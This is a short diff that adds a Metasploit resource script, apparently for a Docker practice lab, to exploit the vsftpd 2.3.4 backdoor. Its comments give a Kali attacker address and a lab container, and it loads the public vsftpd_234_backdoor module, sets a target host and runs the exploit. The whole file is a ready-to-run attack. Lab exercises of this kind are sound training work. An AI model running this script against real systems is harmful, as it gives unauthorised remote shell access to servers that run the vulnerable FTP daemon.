@@ -1,0 +1,10 @@
+# vsftpd 2.3.4 Backdoor - One-shot exploit
+# Run: msfconsole -q -r ~/.msf4/scripts/pwn-vsftpd.rc
+#
+# Prerequisites:
+#   - vsftpd container running (docker compose up -d vsftpd)
+#   - Kali on 172.20.0.5
+
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 172.20.0.15
+exploit
